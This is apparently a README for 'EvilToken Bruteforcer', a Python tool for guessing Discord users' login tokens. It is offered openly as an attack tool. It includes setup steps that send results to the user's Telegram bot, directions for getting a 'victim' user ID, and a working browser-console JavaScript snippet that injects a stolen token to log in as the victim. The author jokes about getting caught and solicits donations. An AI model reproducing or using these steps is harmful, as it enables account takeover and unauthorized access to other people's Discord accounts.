# EvilToken Bruteforcer.
This script is used to bruteforce or guess the login access token for Discord users. I'm just improving the code, thanks to @NAOYY for publishing the source code. Cross Platform, has been tested via Macintosh OS and Microsoft Windows systems. I don't know if it works on Termux or not.

## Screenshots Program.
![Screenshot MacOS](https://i.ibb.co/zxSLDDP/photo-2021-02-03-12-36-19.jpg)
![Screenshot Windows](https://i.ibb.co/rpzQztd/Entod-Token-SS.jpg)
## Installation

Python version 3 is required, and of course [pip](https://pip.pypa.io/en/stable/) to install the module.

```python
pip install signal
pip install discord
pip install colorama
```

## How to use

It's quite easy, just edit the source code to your personal info as you like. The only thing left to do is edit the Bot Token and their respective User IDs.

```python
# Send messages to Telegram Bot.
def sendteleg(botmsg):
   bot_token = 'BotTokenLo'
   bot_chatID = 'UserIDLo'
```

Also make sure to change the Discord setting to Developer Mode to get the Victim Discord User ID. The trick is to go to Settings > Appearance > Developer Mode. If it's been activated, just right-click on the victim and at the bottom it says "Copy ID". Just put it in the program.

![bro](https://i.ibb.co/tz4zYTg/image.png)

The bruteforcing success? Just login using the token that was successfully bruteforced. The way to login via token is actually quite easy to log in. Just need a little knowledge about the browser.

1. Open Incognito Mode in Google Chrome
2. Go to https://discord.com/app
3. Open Developer Tools and go to Console
4. Copy Paste the following code

```js
(function() {
    window.t = "CHANGE THIS TO A VICTIM TOKEN"
    window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;
    window.setInterval(() => window.localStorage.token = `"${window.t}"`);
    window.location.reload();
})();
```

5. Enter and boom, logged in.

## Contributing
It's free what you want to do, but as long as you don't buy and sell, this program is the same as claiming to be made by you. Just be careful if you get caught, asu is really a skidder. If you have suggestions, please contact me: @FallenV4 via Telegram.

Please donate to me, I don't have any income for this.

[PayPal](https://paypal.me/akmalpv4) |
[Saweria](https://saweria.co/fallenv4) | [YouTube](https://www.youtube.com/channel/UCPlVO-tSnP8TCMDKLx49Rwg) | [Group Telegram](https://t.me/fallenkuy)
## Why did you do this?
There's a reason, for sure :).
